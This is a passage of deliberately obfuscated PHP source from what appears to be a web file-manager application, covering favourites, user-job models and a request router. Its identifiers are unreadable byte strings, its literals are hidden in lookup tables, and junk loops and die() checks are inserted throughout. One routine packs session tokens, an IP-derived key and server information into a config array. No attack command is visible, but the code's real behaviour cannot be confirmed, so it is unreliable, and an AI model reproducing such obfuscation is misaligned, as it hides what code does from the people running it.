$‰òÑ˙œá = false) { $ë©™√√Ω =& $_SERVER[ˆë€Ï⁄∂]; $º÷»ÚΩª = $this->listData($‰¿Â éç); if (!$º÷»ÚΩª) { return; } if (!$‰òÑ˙œá && $º÷»ÚΩª[$ë©™√√Ω[201]] == $ë©™√√Ω[101]) { return !1; } return parent::remove($‰¿Â éç); } public function enable($ŒºùÍï„, $ˆèŸ˙ï√) { return $this->update($ŒºùÍï„, array($_SERVER[ˆë€Ï⁄∂][2463] => $ˆèŸ˙ï√)); } public function run($ÌÊ“Ã¿á) { return $this->update($ÌÊ“Ã¿á, array($_SERVER[ˆë€Ï⁄∂][2475] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\163\145\162\x5f\x66\x61\x76"; protected function cacheFunctionAlias($»·πç≈˚) { $©ÅÍ¿ù¸ =& $_SERVER[ˆë€Ï⁄∂]; return array($©ÅÍ¿ù¸[2103] => array(USER_ID, $©ÅÍ¿ù¸[2476])); } protected function listData() { $ΩÈßï§¢ =& $_SERVER[ˆë€Ï⁄∂]; $˜÷œ¿ª = array($ΩÈßï§¢[1778] => USER_ID, $ΩÈßï§¢[568] => 0); $“ıïπÁ÷ = $ΩÈßï§¢[2477]; $Òó≤ÁÌâ = $this->field($“ıïπÁ÷)->where($˜÷œ¿ª)->order($ΩÈßï§¢[2478])->select(); return $Òó≤ÁÌâ ? $Òó≤ÁÌâ : array(); } protected function resetCache() { } protected function listView() { $ﬁ›≥πßö =& $_SERVER[ˆë€Ï⁄∂]; $¯“Î™ùÑ = $this->listData(); $ÆŒ¢ÃÜﬂ = array_filter_by_field($¯“Î™ùÑ, $ﬁ›≥πßö[33], $ﬁ›≥πßö[501]); $‚ÀêÃœø = array_to_keyvalue($ÆŒ¢ÃÜﬂ, $ﬁ›≥πßö[12], $ﬁ›≥πßö[97]); if (!$‚ÀêÃœø) { return $¯“Î™ùÑ; } $åå¸ª¯õ = 2000; $◊âú™Ø¸ = array($ﬁ›≥πßö[502] => array($ﬁ›≥πßö[503], $‚ÀêÃœø)); $⁄úÄ˝°« = Model($ﬁ›≥πßö[916])->listSource($◊âú™Ø¸, $åå¸ª¯õ); $⁄úÄ˝°« = array_merge($⁄úÄ˝°«[$ﬁ›≥πßö[96]], $⁄úÄ˝°«[$ﬁ›≥πßö[95]]); $⁄úÄ˝°« = array_to_keyvalue($⁄úÄ˝°«, $ﬁ›≥πßö[203]); foreach ($¯“Î™ùÑ as $”üˆ©˜Ò => $àŒÜÙÓƒ) { $ìÃÎ—Ä— = $⁄úÄ˝°«[$àŒÜÙÓƒ[$ﬁ›≥πßö[97]]]; $ìÃÎ—Ä— = $ìÃÎ—Ä— ? $ìÃÎ—Ä— : array(); $¯“Î™ùÑ[$”üˆ©˜Ò] = array_merge($ìÃÎ—Ä—, $àŒÜÙÓƒ); } return $¯“Î™ùÑ; } protected function addFav($Ã‰¬Âó≥, $åŒå÷å‡ = '', $°‡¡µ›Ò = "\x73\157\x75\x72\143\x65") { $ª¢Á‘…Ã =& $_SERVER[ˆë€Ï⁄∂]; $≈ﬁëê€Ô = array($ª¢Á‘…Ã[1778] => USER_ID, $ª¢Á‘…Ã[568] => 0, $ª¢Á‘…Ã[507] => $°‡¡µ›Ò, $ª¢Á‘…Ã[506] => $Ã‰¬Âó≥); if ($this->where($≈ﬁëê€Ô)->find()) { return !1; } $≈ﬁëê€Ô = array($ª¢Á‘…Ã[1778] => USER_ID, $ª¢Á‘…Ã[568] => 0); $≥Ñ∑Õ¡™ = $this->where($≈ﬁëê€Ô)->max($ª¢Á‘…Ã[2012]); if (!$≥Ñ∑Õ¡™) { $≥Ñ∑Õ¡™ = 0; } if (!$åŒå÷å‡ && $°‡¡µ›Ò == $ª¢Á‘…Ã[501]) { $∂≈ÕÂ·Ò = Model($ª¢Á‘…Ã[1436])->where(array($ª¢Á‘…Ã[502] => $Ã‰¬Âó≥))->find(); if (!$∂≈ÕÂ·Ò) { return !1; } $åŒå÷å‡ = $∂≈ÕÂ·Ò[$ª¢Á‘…Ã[32]]; } $åŒå÷å‡ = $this->getAutoName($åŒå÷å‡); $Áê–ñ∫ÿ = array($ª¢Á‘…Ã[1778] => USER_ID, $ª¢Á‘…Ã[568] => 0, $ª¢Á‘…Ã[505] => $åŒå÷å‡, $ª¢Á‘…Ã[506] => $Ã‰¬Âó≥, $ª¢Á‘…Ã[507] => $°‡¡µ›Ò, $ª¢Á‘…Ã[1992] => $≥Ñ∑Õ¡™ + 1); return $this->add($Áê–ñ∫ÿ); } protected function remove($÷≈Ω‰„⁄) { $î¬«í´≥ =& $_SERVER[ˆë€Ï⁄∂]; $ê—Æﬁ‰‘ = array($î¬«í´≥[1778] => USER_ID, $î¬«í´≥[504] => $÷≈Ω‰„⁄); return $this->where($ê—Æﬁ‰‘)->delete(); } protected function removeByName($éœ˝Œè¿) { $ïÈÔáÀÛ =& $_SERVER[ˆë€Ï⁄∂]; $ãŒß∑Ùæ = array($ïÈÔáÀÛ[1778] => USER_ID, $ïÈÔáÀÛ[505] => $éœ˝Œè¿, $ïÈÔáÀÛ[568] => 0); return $this->where($ãŒß∑Ùæ)->delete(); } protected function rename($ÇñÂ©æƒ, $˛÷ù≈È) { $·ôÚÂ·É =& $_SERVER[ˆë€Ï⁄∂]; if ($ÇñÂ©æƒ == $˛÷ù≈È) { return !1; } $øüìÛÁß = $this->getAutoName($˛÷ù≈È); if ($˛÷ù≈È != $øüìÛÁß) { return !1; } $Ïã«ŸÜ§ = array($·ôÚÂ·É[1778] => USER_ID, $·ôÚÂ·É[568] => 0, $·ôÚÂ·É[32] => $ÇñÂ©æƒ); return $this->where($Ïã«ŸÜ§)->save(array($·ôÚÂ·É[32] => $˛÷ù≈È)); } protected function resetSort($üÆú“ﬁ’) { $‚˙≥ÅêΩ =& $_SERVER[ˆë€Ï⁄∂]; $üÆú“ﬁ’ = is_array($üÆú“ﬁ’) ? $üÆú“ﬁ’ : array(); $∫∑›˙£˜ = array($‚˙≥ÅêΩ[1778] => USER_ID); for ($ÅååëÍ° = 0; $ÅååëÍ° < count($üÆú“ﬁ’); $ÅååëÍ°++) { $∫∑›˙£˜[$‚˙≥ÅêΩ[504]] = $üÆú“ﬁ’[$ÅååëÍ°]; $this->where($∫∑›˙£˜)->save(array($‚˙≥ÅêΩ[1992] => $ÅååëÍ° + 1)); } return !0; } protected function moveTop($É‰◊Ωí) { $Æªı›ßå =& $_SERVER[ˆë€Ï⁄∂]; $ΩÜìü¡ı = array($Æªı›ßå[1778] => USER_ID, $Æªı›ßå[568] => 0); $æ‘ﬂ∆∂å = $this->where($ΩÜìü¡ı)->where(array($Æªı›ßå[32] => $É‰◊Ωí))->find(); if (!$æ‘ﬂ∆∂å) { return; } $êúÀßÌÂ = $this->field($Æªı›ßå[486])->where($ΩÜìü¡ı)->order($Æªı›ßå[2478])->select(); $êúÀßÌÂ = array_to_keyvalue($êúÀßÌÂ, $Æªı›ßå[12], $Æªı›ßå[486]); $Íê√Ê∆ƒ = $êúÀßÌÂ; $êúÀßÌÂ = array_remove_value($êúÀßÌÂ, $æ‘ﬂ∆∂å[$Æªı›ßå[486]]); array_unshift($êúÀßÌÂ, $æ‘ﬂ∆∂å[$Æªı›ßå[486]]); return $this->resetSort($êúÀßÌÂ); } protected function moveBottom($ó∏Ï‡∂Î) { $˙Ê⁄Ú˛Æ =& $_SERVER[ˆë€Ï⁄∂]; $ ß∆Ê•ß = array($˙Ê⁄Ú˛Æ[1778] => USER_ID, $˙Ê⁄Ú˛Æ[568] => 0); $°Èﬂ¸ø® = $this->where($ ß∆Ê•ß)->max($˙Ê⁄Ú˛Æ[2012]); $…ÑÎ·Á¬ = array($˙Ê⁄Ú˛Æ[2012] => $°Èﬂ¸ø® + 1); return $this->where($ ß∆Ê•ß)->where(array($˙Ê⁄Ú˛Æ[32] => $ó∏Ï‡∂Î))->save($…ÑÎ·Á¬); } private function getAutoName($ùóÛô¿…) { $Œ‡À’“Ù =& $_SERVER[ˆë€Ï⁄∂]; $ûñﬁÆà¬ = array($Œ‡À’“Ù[1778] => USER_ID, $Œ‡À’“Ù[568] => 0); $¯Ÿ∑í≥… = $this->field($Œ‡À’“Ù[32])->where($ûñﬁÆà¬)->select(); $¯Ÿ∑í≥… = array_to_keyvalue($¯Ÿ∑í≥…, $Œ‡À’“Ù[12], $Œ‡À’“Ù[32]); if (!$¯Ÿ∑í≥… || !in_array($ùóÛô¿…, $¯Ÿ∑í≥…)) { return $ùóÛô¿…; } for ($˛é≈Õ¯≥ = 0; $˛é≈Õ¯≥ < count($¯Ÿ∑í≥…); $˛é≈Õ¯≥++) { if (!in_array($ùóÛô¿… . "\50{$˛é≈Õ¯≥}\51", $¯Ÿ∑í≥…)) { return $ùóÛô¿… . "\50{$˛é≈Õ¯≥}\51"; } } return $ùóÛô¿… . "\x28{$˛é≈Õ¯≥}\x29"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\163\164\x65\155\x2e\152\157\142\x4c\151\163\164"; public $field = array("\156\x61\x6d\x65", "\144\x65\163\143", "\163\x6f\x72\x74"); const JOB_KEY = "\x73\x65\x6c\x66\x4a\157\x62\x4c\151\163\x74"; public function listData($ãß“®ëÅ = false, $∑∂√‘ŸÚ = "\x73\x6f\x72\164", $ÇŒÒ≤–— = false) { return parent::listData($ãß“®ëÅ, $∑∂√‘ŸÚ, $ÇŒÒ≤–—); } public function remove($¿ÌÈ∞ŒÆ) { return parent::remove($¿ÌÈ∞ŒÆ); } public function add($Ä„¨Ï≥£) { $ÁßÕê´ﬂ =& $_SERVER[ˆë€Ï⁄∂]; if ($this->findByName($Ä„¨Ï≥£[$ÁßÕê´ﬂ[32]])) { return !1; } $Ä„¨Ï≥£[$ÁßÕê´ﬂ[2012]] = $this->getSort(); return parent::insert($Ä„¨Ï≥£); } private function getSort() { $¢ÆãÌúÜ =& $_SERVER[ˆë€Ï⁄∂]; $≠é∞ƒ≤∆ = parent::listData(); $Ï•÷⁄‹◊ = array_to_keyvalue($≠é∞ƒ≤∆, $¢ÆãÌúÜ[12], $¢ÆãÌúÜ[2012]); return empty($Ï•÷⁄‹◊) ? 0 : max($Ï•÷⁄‹◊) + 1; } public function update($≈ﬁ§ö◊¥, $üÔ–ç√ƒ) { $˙¸ó≥√ì =& $_SERVER[ˆë€Ï⁄∂]; $˝ã∞Úª = parent::listData($≈ﬁ§ö◊¥); $™›€˘¿˜ = $this->findByName($üÔ–ç√ƒ[$˙¸ó≥√ì[32]]); if (!$˝ã∞Úª || $™›€˘¿˜ && $™›€˘¿˜[$˙¸ó≥√ì[486]] != $˝ã∞Úª[$˙¸ó≥√ì[486]]) { return !1; } return parent::update($≈ﬁ§ö◊¥, $üÔ–ç√ƒ); } public function setUserJob($èéò¶ÎË, $∆±È≤ﬁÑ) { $•ì¯Â«◊ =& $_SERVER[ˆë€Ï⁄∂]; if (!is_array($∆±È≤ﬁÑ)) { $∆±È≤ﬁÑ = array($∆±È≤ﬁÑ); } $õÈ„÷˝± = parent::listData(); $•û“∏òŸ = array_to_keyvalue($õÈ„÷˝±, $•ì¯Â«◊[32]); $Ôªàè‘‰ = $•ì¯Â«◊[465]; foreach ($∆±È≤ﬁÑ as $¢Ç¢∆∑Á) { if ($•û“∏òŸ[$¢Ç¢∆∑Á]) { $Ôªàè‘‰ .= $•û“∏òŸ[$¢Ç¢∆∑Á][$•ì¯Â«◊[486]] . $•ì¯Â«◊[50]; } else { $∂ÛîØøÜ = $this->add($¢Ç¢∆∑Á); $Ôªàè‘‰ .= $∂ÛîØøÜ . $•ì¯Â«◊[50]; } } $Ôªàè‘‰ = rtrim($Ôªàè‘‰, $•ì¯Â«◊[50]); Model($•ì¯Â«◊[608])->metaSet($èéò¶ÎË, self::JOB_KEY, $Ôªàè‘‰); } public function getUserJob($≥≠úúë≤) { $çñ≤¶à… = Model($_SERVER[ˆë€Ï⁄∂][608])->metaGet($≥≠úúë≤); return $this->getUserJobInfo($çñ≤¶à…[self::JOB_KEY]); } public function getUserJobInfo($¬°„ùìû) { $Ãø¸”≥ =& $_SERVER[ˆë€Ï⁄∂]; $Ò‡ƒ„Î™ = explode($Ãø¸”≥[50], $¬°„ùìû); $ø˝Ë∏º = parent::listData(); $ø˝Ë∏º = array_remove_key($ø˝Ë∏º, $Ãø¸”≥[243]); $‘¬î˛∂ƒ = array(); foreach ($Ò‡ƒ„Î™ as $˙ïÕ∫±™) { if (isset($ø˝Ë∏º[$˙ïÕ∫±™])) { $‘¬î˛∂ƒ[] = $ø˝Ë∏º[$˙ïÕ∫±™]; } } return $‘¬î˛∂ƒ; } } goto FÊÉ·ÇÁüä; DêÈ™Î€‘ª: $sfxmljpqeo = $_SERVER[ˆë€Ï⁄∂][697]; if (!$sfxmljpqeo) { die; } class Application { private $defaultModule = "\x69\x6e\144\x65\x78"; private $defaultController = "\151\156\144\145\170"; private $defaultAction = "\151\156\x64\145\170"; function __construct() { } public function setDefault($â£Õ‹Ô®) { $‹¢å¡¸° =& $_SERVER[ˆë€Ï⁄∂]; $ÑÌÉÀ¨ê =& $_SERVER[ﬂéá≤›]; $Èº¶—ÀÊ = explode($ÑÌÉÀ¨ê[0], trim($â£Õ‹Ô®, $ÑÌÉÀ¨ê[0])); $⁄à€˝œø = $‹¢å¡¸°[698]; $this->defaultModule = $Èº¶—ÀÊ[0] ? $Èº¶—ÀÊ[0] : $this->defaultModule; $Ü¯ï—ü¶ = $‹¢å¡¸°[699]; while (strlen($Ü¯ï—ü¶) < $‹¢å¡¸°[700]) { if (!$Ü¯ï—ü¶) { break; } $Ü¯ï—ü¶++; } $this->defaultController = $Èº¶—ÀÊ[1] ? $Èº¶—ÀÊ[1] : $this->defaultController; $this->defaultAction = $Èº¶—ÀÊ[2] ? $Èº¶—ÀÊ[2] : $this->defaultAction; $˛∞…è∑Ê = $‹¢å¡¸°[701]; if (!$˛∞…è∑Ê) { die; } $this->yihc9d5ab45c($ÑÌÉÀ¨ê[1], array($this, $ÑÌÉÀ¨ê[2])); $«âˆøÎÈ = $‹¢å¡¸°[702]; while (strlen($«âˆøÎÈ) < $‹¢å¡¸°[703]) { if (!$«âˆøÎÈ) { break; } $«âˆøÎÈ++; } } public function appRun($˙‚óãÍ¡) { $ÂÏŸŸ÷á =& $_SERVER[ˆë€Ï⁄∂]; $⁄•ãÅµï =& $_SERVER[ﬂéá≤›]; $˝Ú¬¶Ù≠ = explode($⁄•ãÅµï[0], $˙‚óãÍ¡); $∑‹ä˘Ò˚ = $ÂÏŸŸ÷á[704]; $Úºëÿπ⁄ = strtolower($˝Ú¬¶Ù≠[0]); $√ä«Û‚´ = $ÂÏŸŸ÷á[705]; if (strlen($√ä«Û‚´) < $ÂÏŸŸ÷á[60]) { die; } $‚Õ©∑ı“ = $⁄•ãÅµï[3]; $Œ≥¨Ù–≈ = $ÂÏŸŸ÷á[706]; if (strlen($Œ≥¨Ù–≈) < $ÂÏŸŸ÷á[700]) { die; } if ($Úºëÿπ⁄ == $⁄•ãÅµï[4]) { $‚Õ©∑ı“ = $⁄•ãÅµï[5]; $˝Ú¬¶Ù≠[0] = $⁄•ãÅµï[6]; $˝Ú¬¶Ù≠[1] = $˝Ú¬¶Ù≠[1] . $⁄•ãÅµï[7]; $˙‚óãÍ¡ = join($⁄•ãÅµï[0], $˝Ú¬¶Ù≠); $˙‚óãÍ¡ = trim($˙‚óãÍ¡, $⁄•ãÅµï[0]); } call_user_func(array($⁄•ãÅµï[8], $⁄•ãÅµï[9]), $‚Õ©∑ı“ . $⁄•ãÅµï[10], $˙‚óãÍ¡); ActionCall($˙‚óãÍ¡); call_user_func(array($⁄•ãÅµï[8], $⁄•ãÅµï[9]), $‚Õ©∑ı“ . $⁄•ãÅµï[11], $˙‚óãÍ¡); $°À™Ò≥ƒ = $ÂÏŸŸ÷á[707]; if (!$°À™Ò≥ƒ) { die; } } private function autorun() { $≥˚¸⁄ı§ =& $_SERVER[ˆë€Ï⁄∂]; $Ãö”“üî =& $_SERVER[ﬂéá≤›]; global $config; if (count($config[$Ãö”“üî[12]]) == 0) { return; } foreach ($config[$Ãö”“üî[12]] as $∫∑◊ç’£ => $∏ÅπÍóÿ) { $this->appRun($∏ÅπÍóÿ); $ï«Á≈Ã = $≥˚¸⁄ı§[708]; while (strlen($ï«Á≈Ã) < $≥˚¸⁄ı§[700]) { if (!$ï«Á≈Ã) { break; } $ï«Á≈Ã++; } } } private function dueb7db63e23() { $‰“Ìú˛Í =& $_SERVER[ˆë€Ï⁄∂]; $¬Æ≠ˆ‚œ =& $_SERVER[ﬂéá≤›]; $– ã≠ùò = $¬Æ≠ˆ‚œ[4]; $Í—Áﬂ…‚ = $‰“Ìú˛Í[709]; while ($Í—Áﬂ…‚ < $‰“Ìú˛Í[710]) { if ($Í—Áﬂ…‚ >= 0) { break; } $Í—Áﬂ…‚++; } $áÖ⁄¿¸ã = $GLOBALS[$¬Æ≠ˆ‚œ[13]][$¬Æ≠ˆ‚œ[14]][0]; $ÇÿÖÜ–ã = $‰“Ìú˛Í[711]; if (strlen($ÇÿÖÜ–ã) < $‰“Ìú˛Í[703]) { die; } if (!$áÖ⁄¿¸ã || strlen($áÖ⁄¿¸ã) <= strlen($– ã≠ùò)) { return; } if (strtolower(substr($áÖ⁄¿¸ã, -strlen($– ã≠ùò))) != $– ã≠ùò) { return; } $Ÿ¡ë≈∫Ï = substr($áÖ⁄¿¸ã, 0, -strlen($– ã≠ùò)); $ØÁ°ÅÙ‘ = array($¬Æ≠ˆ‚œ[4], $Ÿ¡ë≈∫Ï); $ œ …èâ = $‰“Ìú˛Í[712]; $ôÆ≥‹≤Œ = array_slice($GLOBALS[$¬Æ≠ˆ‚œ[13]][$¬Æ≠ˆ‚œ[14]], 1); $ç˛äØ = $‰“Ìú˛Í[713]; if (strlen($ç˛äØ) < $‰“Ìú˛Í[60]) { die; } $GLOBALS[$¬Æ≠ˆ‚œ[13]][$¬Æ≠ˆ‚œ[14]] = array_merge($ØÁ°ÅÙ‘, $ôÆ≥‹≤Œ); $GLOBALS[$¬Æ≠ˆ‚œ[13]][$¬Æ≠ˆ‚œ[15]] = implode($¬Æ≠ˆ‚œ[0], $GLOBALS[$¬Æ≠ˆ‚œ[13]][$¬Æ≠ˆ‚œ[14]]); $†Æ¬íïÅ = $‰“Ìú˛Í[714]; if (!$†Æ¬íïÅ) { return; } } private function ewfx922686aa() { $û¸ﬁ›ËÉ =& $_SERVER[ˆë€Ï⁄∂]; $ˆùîóä¶ =& $_SERVER[ﬂéá≤›]; if ($GLOBALS[$ˆùîóä¶[13]][$ˆùîóä¶[15]] != $ˆùîóä¶[6]) { return; } $—¨ıç–™ = $_SERVER[$ˆùîóä¶[16]]; $≥õ›Òåƒ = $ˆùîóä¶[17]; $Õﬁ¢ıæ‘ = $û¸ﬁ›ËÉ[715]; if (strlen($Õﬁ¢ıæ‘) < $û¸ﬁ›ËÉ[60]) { die; } if (!strstr($—¨ıç–™, $≥õ›Òåƒ)) { return; } $ΩË¯£ñÑ = strrpos($—¨ıç–™, $≥õ›Òåƒ); $∫Á ˜√À = substr($—¨ıç–™, $ΩË¯£ñÑ + strlen($≥õ›Òåƒ)); $˙¸´øÃÑ = $û¸ﬁ›ËÉ[716]; if (!$˙¸´øÃÑ) { return; } preg_match_all($ˆùîóä¶[18], $∫Á ˜√À, $Óîƒ—ÍÚ); $∑Û§†öÌ = $û¸ﬁ›ËÉ[717]; if (strlen($∑Û§†öÌ) < $û¸ﬁ›ËÉ[710]) { return; } $∫Á ˜√À = trim($Óîƒ—ÍÚ[0][0], $ˆùîóä¶[19]); $GLOBALS[$ˆùîóä¶[13]][$ˆùîóä¶[14]] = explode($ˆùîóä¶[19], $∫Á ˜√À); $ß˜€˙≤· = $û¸ﬁ›ËÉ[718]; $GLOBALS[$ˆùîóä¶[13]][$ˆùîóä¶[15]] = implode($ˆùîóä¶[0], $GLOBALS[$ˆùîóä¶[13]][$ˆùîóä¶[14]]); $⁄ì€‰¯ë = $û¸ﬁ›ËÉ[719]; if (strlen($⁄ì€‰¯ë) < $û¸ﬁ›ËÉ[700]) { die; } } public function run() { $∂ √ÏÓ® =& $_SERVER[ˆë€Ï⁄∂]; $§„úÿÒó =& $_SERVER[ﬂéá≤›]; $this->ewfx922686aa(); $ﬂ§èÎ∂¶ = $∂ √ÏÓ®[720]; if (strlen($ﬂ§èÎ∂¶) < $∂ √ÏÓ®[694]) { die; } $this->dueb7db63e23(); $ó˜ïã£ÿ = $GLOBALS[$§„úÿÒó[13]][$§„úÿÒó[14]]; $Âˆöë¿… = $GLOBALS[$§„úÿÒó[13]][$§„úÿÒó[15]]; $ùáúÀÚ“ = $∂ √ÏÓ®[721]; while (strlen($ùáúÀÚ“) < $∂ √ÏÓ®[710]) { if (!$ùáúÀÚ“) { break; } $ùáúÀÚ“++; } define($§„úÿÒó[20], isset($ó˜ïã£ÿ[0]) && $ó˜ïã£ÿ[0] ? $ó˜ïã£ÿ[0] : $this->defaultModule); $ã‚≥˜¢¯ = $∂ √ÏÓ®[722]; if (strlen($ã‚≥˜¢¯) < $∂ √ÏÓ®[710]) { die; } define($§„úÿÒó[21], isset($ó˜ïã£ÿ[1]) && $ó˜ïã£ÿ[0] ? $ó˜ïã£ÿ[1] : $this->defaultController); define($§„úÿÒó[22], isset($ó˜ïã£ÿ[2]) && $ó˜ïã£ÿ[0] ? $ó˜ïã£ÿ[2] : $this->defaultAction); $Ù¬ıí«∏ = $∂ √ÏÓ®[723]; define($§„úÿÒó[23], MOD . $§„úÿÒó[0] . ST . $§„úÿÒó[0] . ACT); $ΩΩ˘Ñ°⁄ = $∂ √ÏÓ®[724]; $_SERVER[$§„úÿÒó[24]] = strtolower(ACTION); $û˙±˘ü‡ = $∂ √ÏÓ®[725]; $this->autorun(); if (count($ó˜ïã£ÿ) >= 3) { $this->appRun($Âˆöë¿…); } else { $this->appRun(ACTION); } } private $scwxc6467d48 = array(); private $fido40be425b = ''; public function fxskfb420513() { $Ç¡’Üı“ =& $_SERVER[ˆë€Ï⁄∂]; $èáÃ£à– =& $_SERVER[ﬂéá≤›]; $this->emzo09bfb207(); $üöÑôΩ· = $Ç¡’Üı“[726]; $this->ajre0621e604(); $this->cjdh96f95ce2(); $this->theq3951cf31(); $this->swod8ce70706(); $ÃÜÜπ¬ó = $Ç¡’Üı“[727]; if (strlen($ÃÜÜπ¬ó) < $Ç¡’Üı“[710]) { return; } $this->jetb9ff0e678(); $å‚˚Ò™¶ = $Ç¡’Üı“[728]; while ($å‚˚Ò™¶ < $Ç¡’Üı“[60]) { if ($å‚˚Ò™¶ >= 0) { break; } $å‚˚Ò™¶++; } $this->fxyif345e6d5(); $this->yihc9d5ab45c($èáÃ£à–[25], array($this, $èáÃ£à–[26])); $this->yihc9d5ab45c($èáÃ£à–[27], array($this, $èáÃ£à–[28])); $¡˚’•“¯ = $Ç¡’Üı“[729]; while (strlen($¡˚’•“¯) < $Ç¡’Üı“[710]) { if (!$¡˚’•“¯) { break; } $¡˚’•“¯++; } $this->yihc9d5ab45c($èáÃ£à–[29], array($this, $èáÃ£à–[30])); $this->yihc9d5ab45c($èáÃ£à–[31], array($this, $èáÃ£à–[32])); } public function ywivbe42a59b($∂äØËù∞) { $¬ï€òﬂ“ =& $_SERVER[ˆë€Ï⁄∂]; $≠ÌÍ÷¸í =& $_SERVER[ﬂéá≤›]; $‰ÈØÒ≈Ã = Model($≠ÌÍ÷¸í[33])->get(); $¿Î„í•Ô = array($≠ÌÍ÷¸í[34], $≠ÌÍ÷¸í[35], $≠ÌÍ÷¸í[36], $≠ÌÍ÷¸í[37], $≠ÌÍ÷¸í[38], $≠ÌÍ÷¸í[39], $≠ÌÍ÷¸í[40], $≠ÌÍ÷¸í[41], $≠ÌÍ÷¸í[42], $≠ÌÍ÷¸í[43], $≠ÌÍ÷¸í[44], $≠ÌÍ÷¸í[45], $≠ÌÍ÷¸í[46], $≠ÌÍ÷¸í[47], $≠ÌÍ÷¸í[48], $≠ÌÍ÷¸í[49], $≠ÌÍ÷¸í[50], $≠ÌÍ÷¸í[51], $≠ÌÍ÷¸í[52], $≠ÌÍ÷¸í[53], $≠ÌÍ÷¸í[54], $≠ÌÍ÷¸í[55], $≠ÌÍ÷¸í[56], $≠ÌÍ÷¸í[57], $≠ÌÍ÷¸í[58], $≠ÌÍ÷¸í[59], $≠ÌÍ÷¸í[60], $≠ÌÍ÷¸í[61], $≠ÌÍ÷¸í[62], $≠ÌÍ÷¸í[63], $≠ÌÍ÷¸í[64], $≠ÌÍ÷¸í[65], $≠ÌÍ÷¸í[66], $≠ÌÍ÷¸í[67], $≠ÌÍ÷¸í[68], $≠ÌÍ÷¸í[69], $≠ÌÍ÷¸í[70], $≠ÌÍ÷¸í[71], $≠ÌÍ÷¸í[72], $≠ÌÍ÷¸í[73], $≠ÌÍ÷¸í[74], $≠ÌÍ÷¸í[75], $≠ÌÍ÷¸í[76], $≠ÌÍ÷¸í[77], $≠ÌÍ÷¸í[78], $≠ÌÍ÷¸í[79], $≠ÌÍ÷¸í[80], $≠ÌÍ÷¸í[81], $≠ÌÍ÷¸í[82], $≠ÌÍ÷¸í[83], $≠ÌÍ÷¸í[84], $≠ÌÍ÷¸í[85]); $õôü‚π‘ = $¬ï€òﬂ“[730]; if (strlen($õôü‚π‘) < $¬ï€òﬂ“[703]) { return; } foreach ($¿Î„í•Ô as $ê†Ûﬁ‡˙) { $¶Æ•≤Ç° = $GLOBALS[$≠ÌÍ÷¸í[86]][$≠ÌÍ÷¸í[87]][$ê†Ûﬁ‡˙]; if (isset($‰ÈØÒ≈Ã[$ê†Ûﬁ‡˙])) { $¶Æ•≤Ç° = $‰ÈØÒ≈Ã[$ê†Ûﬁ‡˙]; } $∂äØËù∞[$≠ÌÍ÷¸í[88]][$≠ÌÍ÷¸í[89]][$ê†Ûﬁ‡˙] = $¶Æ•≤Ç°; } $õ£˙ûª˙ = $∂äØËù∞[$≠ÌÍ÷¸í[88]][$≠ÌÍ÷¸í[89]][$≠ÌÍ÷¸í[46]]; unset($∂äØËù∞[$≠ÌÍ÷¸í[88]][$≠ÌÍ÷¸í[90]][$≠ÌÍ÷¸í[91]]); unset($∂äØËù∞[$≠ÌÍ÷¸í[88]][$≠ÌÍ÷¸í[90]][$≠ÌÍ÷¸í[92]]); unset($∂äØËù∞[$≠ÌÍ÷¸í[88]][$≠ÌÍ÷¸í[89]][$≠ÌÍ÷¸í[46]]); unset($∂äØËù∞[$≠ÌÍ÷¸í[88]][$≠ÌÍ÷¸í[89]][$≠ÌÍ÷¸í[93]]); $ãÌâ‰≠ä = $¬ï€òﬂ“[731]; $∂äØËù∞[$≠ÌÍ÷¸í[88]][$≠ÌÍ÷¸í[89]][$≠ÌÍ÷¸í[94]] = array($≠ÌÍ÷¸í[95] => (int) $õ£˙ûª˙[$≠ÌÍ÷¸í[96]], $≠ÌÍ÷¸í[97] => (int) _get($õ£˙ûª˙, $≠ÌÍ÷¸í[98], 0)); $«‡˛ƒº∞ = $¬ï€òﬂ“[732]; if (!$«‡˛ƒº∞) { return; } $Û¿ÅèÂø = substr(md5($≠ÌÍ÷¸í[99] . get_client_ip() . $‰ÈØÒ≈Ã[$≠ÌÍ÷¸í[100]]), 0, 15); $∂äØËù∞[$≠ÌÍ÷¸í[101]][$≠ÌÍ÷¸í[102]] = Mcrypt::encode(Session::sign(), $Û¿ÅèÂø, 3600 * 24); $∂äØËù∞[$≠ÌÍ÷¸í[101]][$≠ÌÍ÷¸í[103]] = Action($≠ÌÍ÷¸í[104])->accessToken(); $Ê‹ú∞©ÿ = $¬ï€òﬂ“[733]; while (strlen($Ê‹ú∞©ÿ) < $¬ï€òﬂ“[710]) { if (!$Ê‹ú∞©ÿ) { break; } $Ê‹ú∞©ÿ++; } $∂äØËù∞[$≠ÌÍ÷¸í[101]][$≠ÌÍ÷¸í[105]] = md5($_SERVER[$≠ÌÍ÷¸í[106]] . $‰ÈØÒ≈Ã[$≠ÌÍ÷¸í[100]]); $™Áû≥≤ü = $¬ï€òﬂ“[734]; if (strlen($™Áû≥≤ü) < $¬ï€òﬂ“[710]) { die; } $∂äØËù∞[$≠ÌÍ÷¸í[101]][$≠ÌÍ÷¸í[107]] = base64_encode(serverInfo()); $∂äØËù∞[$≠ÌÍ÷¸í[101]][$≠ÌÍ÷¸í[108]] = $this->fido40be425b; if ($‰ÈØÒ≈Ã[$≠ÌÍ÷¸í[108]] != $≠ÌÍ÷¸í[109]) { $∂äØËù∞[$≠ÌÍ÷¸í[101]][$≠ÌÍ÷¸í[110]] = $‰ÈØÒ≈Ã[$≠ÌÍ÷¸í[110]]; $∂äØËù∞[$≠ÌÍ÷¸í[101]][$≠ÌÍ÷¸í[111]] = $‰ÈØÒ≈Ã[$≠ÌÍ÷¸í[111]]; $öπõà˚º = rand_string(10) . $this->fido40be425b . rand_string(5); $∂äØËù∞[$≠ÌÍ÷¸í[88]][$≠ÌÍ÷¸í[112]][$≠ÌÍ÷¸í[113]] = $this->jqmy7483bc06($öπõà˚º, $∂äØËù∞[$≠ÌÍ÷¸í[101]][$≠ÌÍ÷¸í[105]]); } if ($this->fido40be425b == $≠ÌÍ÷¸í[109]) { $∂äØËù∞[$≠ÌÍ÷¸í[88]][$≠ÌÍ÷¸í[89]][$≠ÌÍ÷¸í[94]][$≠ÌÍ÷¸í[98]] = 0; } $∂äØËù∞[$≠ÌÍ÷¸í[101]][$≠ÌÍ÷¸í[114]] = $this->versionPluginFilter(); $∂äØËù∞[$≠ÌÍ÷¸í[101]][$≠ÌÍ÷¸í[115]] = _get($this->scwxc6467d48, $≠ÌÍ÷¸í[116], $≠ÌÍ÷¸í[6]); if 